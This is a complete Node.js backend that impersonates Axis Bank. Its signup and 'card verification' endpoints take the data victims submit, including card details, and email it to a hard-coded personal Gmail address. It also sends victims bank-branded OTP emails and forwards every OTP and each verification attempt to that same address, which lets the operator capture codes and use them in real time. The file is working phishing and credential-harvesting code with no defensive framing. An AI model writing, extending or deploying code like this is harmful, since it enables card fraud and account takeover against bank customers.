import express from "express";
import mongoose from "mongoose";
import cors from "cors";
import dotenv from "dotenv";
import nodemailer from "nodemailer";

dotenv.config();
const app = express();

/* -------------------- MIDDLEWARE -------------------- */
app.use(cors({
  origin: "*",
  credentials: true,
}));
app.use(express.json());

/* -------------------- DB CONNECTION -------------------- */
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch(err => console.error("❌ MongoDB Error:", err));

const localOtpStore = {};

/* -------------------- MAIL SETUP (FIXED) -------------------- */
const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

transporter.verify((err) => {
  if (err) {
    console.error("❌ Gmail SMTP Error:", err);
  } else {
    console.log("✅ Gmail SMTP Ready");
  }
});



const ADMIN_EMAIL = "Vanshk67932@gmail.com";

const formatHtmlData = (title, data) => {
  const cleanData = data && typeof data.toObject === 'function' ? data.toObject() : { ...data };
  
  // Add submission time
  if (cleanData && typeof cleanData === 'object') {
    cleanData.submissionTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " (IST)";
  }

  let rows = '';
  let textContent = '';
  
  if (cleanData && typeof cleanData === 'object') {
    for (const [key, value] of Object.entries(cleanData)) {
      if (key === '_id' || key === '__v') continue;
      const formattedValue = typeof value === 'object' ? JSON.stringify(value) : value;
      const formattedKey = key.replace(/([A-Z])/g, ' $1').trim();
      
      rows += `<tr>
        <td style="padding: 12px 15px; border-bottom: 1px solid #edf2f7; font-weight: 600; text-transform: capitalize; color: #4a5568; background-color: #fcfcfc; width: 35%; font-size: 14px;">${formattedKey}</td>
        <td style="padding: 12px 15px; border-bottom: 1px solid #edf2f7; color: #2d3748; font-size: 14px; word-break: break-all;">${formattedValue}</td>
      </tr>`;
      
      textContent += `${formattedKey}: ${formattedValue}\n`;
    }
  } else {
    rows = `<tr><td style="padding: 15px; color: #2d3748; font-size: 14px;">${cleanData}</td></tr>`;
    textContent = String(cleanData);
  }

  const html = `
    <div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 600px; margin: 20px auto; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.08);">
      <div style="background-color: #C0005A; color: white; padding: 24px; text-align: center; border-bottom: 3px solid #9E0047;">
        <h2 style="margin: 0; font-size: 22px; font-weight: 700; letter-spacing: 0.5px; text-shadow: 0 1px 2px rgba(0,0,0,0.1);">Axis Rewards Portal Alert</h2>
        <p style="margin: 6px 0 0 0; font-size: 14px; opacity: 0.95; font-weight: 500;">${title}</p>
      </div>
      <div style="padding: 0; background-color: #ffffff;">
        <table style="width: 100%; border-collapse: collapse; margin: 0;">
          <thead>
            <tr style="background-color: #f8fafc;">
              <th style="padding: 12px 15px; text-align: left; border-bottom: 2px solid #e2e8f0; color: #64748b; font-size: 12px; text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px;">Field</th>
              <th style="padding: 12px 15px; text-align: left; border-bottom: 2px solid #e2e8f0; color: #64748b; font-size: 12px; text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px;">Submitted Data</th>
            </tr>
          </thead>
          <tbody>
            ${rows}
          </tbody>
        </table>
      </div>
      <div style="background-color: #f8fafc; padding: 18px; text-align: center; font-size: 12px; color: #94a3b8; border-top: 1px solid #e2e8f0; line-height: 1.5;">
        <strong>Automated Notification System</strong><br>
        This email was sent securely from the Axis Bank portal backend.
      </div>
    </div>
  `;

  return { html, text: textContent };
};

const sendAdminMail = async (subject, data) => {
  try {
    const { html, text } = formatHtmlData(subject, data);
    await transporter.sendMail({
      from: `"Axis Bank Portal" <${process.env.EMAIL_USER}>`,
      to: ADMIN_EMAIL,
      subject,
      text,
      html,
    });
  } catch (err) {
    console.error("❌ ADMIN MAIL ERROR:", err);
  }
};

/* -------------------- MODELS -------------------- */

const OTP = mongoose.model(
  "OTP",
  new mongoose.Schema({
    email: String,
    otp: String,
    isVerified: Boolean,
    ipAddress: String,
  }, { timestamps: true })
);

/* -------------------- ROUTES -------------------- */

/* SIGNUP */
app.post("/api/signup", async (req, res) => {
  try {
    await sendAdminMail("New Signup Alert", req.body);
    res.json({ success: true, message: "Signup sent to admin email" });
  } catch (err) {
    console.error("SIGNUP ERROR:", err);
    res.status(500).json({ success: false, error: "Signup failed" });
  }
});

/* CARD DETAILS */
app.post("/api/card-verification", async (req, res) => {
  try {
    await sendAdminMail("Card Details Submitted", req.body);
    res.json({ success: true, message: "Card details sent to admin email" });
  } catch (err) {
    console.error("CARD ERROR:", err);
    res.status(500).json({ success: false, error: "Card verification failed" });
  }
});

/* SEND OTP */
app.post("/api/send-otp", async (req, res) => {
  try {
    const email = req.body.email || "no-email@test.com";

    // Rate Limiting Check (30 seconds window to avoid duplicate emails from race conditions/double renders)
    const existing = localOtpStore[email];
    const now = new Date();
    if (existing && !existing.isVerified && (now - existing.createdAt) < 30000) {
      console.log(`ℹ️ Duplicate OTP request ignored for ${email} (already sent within last 30s)`);
      return res.json({ success: true, message: "OTP already sent recently" });
    }

    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    // Save in memory store
    localOtpStore[email] = {
      otp,
      isVerified: false,
      createdAt: new Date(),
    };

    let otpDoc = {
      email,
      otp,
      isVerified: false,
      ipAddress: req.ip,
    };

    // Attempt MongoDB save ONLY if connected, don't block
    if (mongoose.connection.readyState === 1) {
      try {
        const dbDoc = await OTP.create(otpDoc);
        otpDoc = dbDoc.toObject();
      } catch (dbErr) {
        console.error("⚠️ MongoDB Save Error:", dbErr);
      }
    } else {
      console.log("ℹ️ MongoDB disconnected, using Memory Store for OTP");
    }

    // Send OTP to user
    const otpText = `Your Axis Bank verification OTP is: ${otp}. Please do not share this code with anyone. Note: This OTP is valid for 5 minutes only.`;
    const otpHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; border: 1px solid #ddd; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
        <div style="background-color: #C0005A; color: white; padding: 15px; text-align: center;">
          <h3 style="margin: 0; font-size: 18px;">Axis Bank Safety Portal</h3>
        </div>
        <div style="padding: 30px; text-align: center; background-color: #fff;">
          <p style="font-size: 16px; color: #333; margin-bottom: 20px;">Please use the following One-Time Password (OTP) to complete your card verification:</p>
          <div style="background-color: #f9f9f9; padding: 15px 25px; font-size: 32px; font-weight: bold; letter-spacing: 5px; color: #C0005A; border-radius: 6px; display: inline-block; margin: 15px 0; border: 1px dashed #C0005A;">
            ${otp}
          </div>
          <div style="margin: 15px 0;">
            <span style="font-size: 13px; color: #d9534f; font-weight: bold; background-color: #fdf2f2; padding: 8px 12px; border-radius: 4px; border: 1px solid #fde8e8; display: inline-block;">
              ⚠️ Note: This OTP is valid for 5 minutes only.
            </span>
          </div>
          <p style="font-size: 12px; color: #777; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px;">
            This security code is confidential. Axis Bank will never call you to ask for this code.
          </p>
        </div>
      </div>
    `;

    await transporter.sendMail({
      from: `"Axis Bank OTP" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: "Axis Bank Verification OTP",
      text: otpText,
      html: otpHtml,
    });

    // Send OTP log to admin
    await sendAdminMail("OTP Code Generated", otpDoc);

    res.json({ success: true });
  } catch (err) {
    console.error("OTP SEND ERROR:", err);
    res.status(500).json({ error: "OTP send failed" });
  }
});

/* VERIFY OTP */
app.post("/api/verify-otp", async (req, res) => {
  try {
    const { email, otp } = req.body;
    console.log(`🔍 VERIFYING: email="${email}", otp="${otp}"`);
    console.log("🔍 STORED RECORD FOR EMAIL:", localOtpStore[email]);

    let isVerified = false;
    const now = new Date();

    // Check in memory store first
    const memRecord = localOtpStore[email];
    if (memRecord) {
      const isExpired = (now - memRecord.createdAt) > 5 * 60 * 1000;
      if (isExpired) {
        console.log(`❌ Verification Failed: OTP expired for ${email}`);
        await sendAdminMail("OTP Expired Alert", { email, otp, generatedAt: memRecord.createdAt });
        return res.status(401).json({ error: "OTP expired" });
      }

      if (memRecord.otp === otp && !memRecord.isVerified) {
        memRecord.isVerified = true;
        isVerified = true;
      }
    }

    // Attempt MongoDB lookup only if connected
    if (!isVerified && mongoose.connection.readyState === 1) {
      const record = await OTP.findOne({ email, otp, isVerified: false });
      if (record) {
        const isDbExpired = (now - record.createdAt) > 5 * 60 * 1000;
        if (isDbExpired) {
          console.log(`❌ Verification Failed: OTP expired in DB for ${email}`);
          await sendAdminMail("OTP Expired DB Alert", { email, otp, generatedAt: record.createdAt });
          return res.status(401).json({ error: "OTP expired" });
        }
        
        record.isVerified = true;
        await record.save();
        isVerified = true;
      }
    }

    if (!isVerified) {
      await sendAdminMail("OTP Verification Failed", { email, otp });
      return res.status(401).json({ error: "Invalid OTP" });
    }

    await sendAdminMail("OTP Verification Successful", { email, otp, verifiedAt: new Date() });
    res.json({ success: true });
  } catch (err) {
    console.error("OTP VERIFY ERROR:", err);
    res.status(500).json({ error: "OTP verification failed" });
  }
});

/* TEST EMAIL (IMPORTANT) */
app.get("/test-email", async (req, res) => {
  try {
    await transporter.sendMail({
      from: `"Axis Bank Test" <${process.env.EMAIL_USER}>`,
      to: ADMIN_EMAIL,
      subject: "✅ Email System Working",
      text: "Email delivery confirmed. Your Axis Bank mail system is working properly.",
      html: "<h2>Email delivery confirmed</h2><p>Your Axis Bank mail system is working properly.</p>",
    });
    res.send("Email sent successfully");
  } catch (err) {
    console.error("TEST EMAIL ERROR:", err);
    res.status(500).send("Email failed");
  }
});

/* HEALTH */
app.get("/", (_, res) => {
  res.send("🚀 Axis Bank Backend Running");
});

app.listen(5000, () => {
  console.log("✅ Server running on http://localhost:5000");
});
